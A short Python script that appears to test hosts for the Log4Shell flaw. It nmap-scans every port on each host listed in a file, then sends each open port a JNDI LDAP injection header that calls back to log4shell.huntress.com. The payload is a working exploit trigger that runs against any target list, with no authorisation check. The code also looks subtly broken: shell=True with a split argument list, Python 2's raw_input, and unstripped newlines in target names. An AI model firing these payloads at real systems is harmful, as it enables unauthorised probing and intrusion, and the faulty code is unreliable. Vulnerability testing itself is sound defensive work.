

import requests
import shlex
import subprocess


targets = []
formattedTargets = []

#get all the hosts you want to test
def importTargets():
    #Read a file with targets
    print("\nImporting Targets...")
    file = open("Targets.txt", "r")
    for line in file:
        targets.append(line)

    print("Targets Imported Successfully")


#Find the open ports on each host
def findOpenPorts():
    print("\nFinding open ports on all targets... \nThis may take a long time depending on the number of targets you have specified.")
    for target in targets:

        proc = subprocess.Popen(shlex.split('nmap -sS -p- %s' % (target)), shell=True, stdout=subprocess.PIPE)

        #save the open ports and the target to a list.
        #output = proc.communicate()[0]

        #output = output.splitlines()
        for line in proc.stdout:
            temp = line.decode()
            components = temp.split('/')

            if len(components) > 1:
                if "open" in temp:
                    port = components[0]

                    formattedTargets.append('https://%s:%s' % (target, port))
                    formattedTargets.append('http://%s:%s' %(target, port))

    print("Target enumeration complete. Targets found: \n %s" % (formattedTargets))

#for each open port on each host, test whether they are vulnerable using huntress
#send http request
def runExploitTest(customLdapConnection):

    print("\n Sending Payloads to targets...")
    headers = {"X-Api-Version": "${jndi:ldap://log4shell.huntress.com:1389/%s}" % (customLdapConnection)}

    for ft in formattedTargets:
        try:
            response = requests.request(method='GET', url=ft, headers=headers)
        except(requests.exceptions.RequestException):
            pass

    print("Payloads sent to all open ports, please switch to the Huntress website to view any vulnerable devices.")

if __name__=="__main__":

    LdapConnection = raw_input("Please enter your custom LDAP Connection string provided to you by huntress: \n")

    importTargets()
    findOpenPorts()
    runExploitTest(LdapConnection)
